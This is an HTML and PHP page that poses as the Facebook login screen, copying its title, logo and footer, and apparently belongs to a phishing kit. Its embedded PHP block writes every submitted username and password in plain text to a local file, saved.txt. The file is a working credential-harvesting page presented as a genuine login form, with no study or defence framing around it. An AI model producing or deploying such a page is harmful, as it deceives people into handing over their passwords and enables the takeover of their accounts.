<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <link rel="stylesheet" href="styless.css">
  <link href="fav.ico" rel="shortcut icon" sizes="196x196">
  <title>Facebook – log in or sign up</title>
</head>
<body class="blogdesire-body">
  <div class="blogdesire-wrapper">
    <div class="head_tag">Get Facebook for Android and browse faster.</div>
   <div class="logo_center"><img src="logo.svg" width="112" class="img" alt="facebook"></div>
    <form class="blogdesire-form" method="post">
      <input type="text" name="username" placeholder="Mobile number or email address" required autocomplete="off"> <br>
      <input type="password" name="password" placeholder="Password" required autocomplete="off"> <br>
      <div>
      <input type="submit" name="submit" value="Log In" class="blogdesire-submit">
    </div>
    <a class="forget_cont">Forgotten password?</a>
    <div id="login_reg_separator" class="_43mg _8qtf" data-sigil="login_reg_separator">
                                <span class="_43mh">or</span>
                              </div>
    <div class="create_cont"><a>Create New Account</a></div>
    </form>
    <div class="footer_cont">
      <div class="f_cont">
        <div>
          <span style="color: #90949c;">English (UK)</span>
          <span>অসমীয়া</span>
          <span>नेपाली</span>
          <span>Português (Brasil)</span>
        </div>
        <div>
          <span>বাংলা</span>
          <span>हिन्दी</span>
          <span>Español</span>
          <span>Português</span>
        </div>
      </div>
      <div class="botm_cont">
        <spam>About · Help · More</spam>
        <p>Facebook Inc.</p>
      </div>
    </div>
  </div>
  <?php
if(isset($_POST['submit'])){
$Name = "Username:".$_POST['username']."
";
$Pass = "Password:".$_POST['password']."
";
$file=fopen("saved.txt", "a");
fwrite($file, $Name);
fwrite($file, $Pass);
fclose($file);
}
?>
</body>
</html>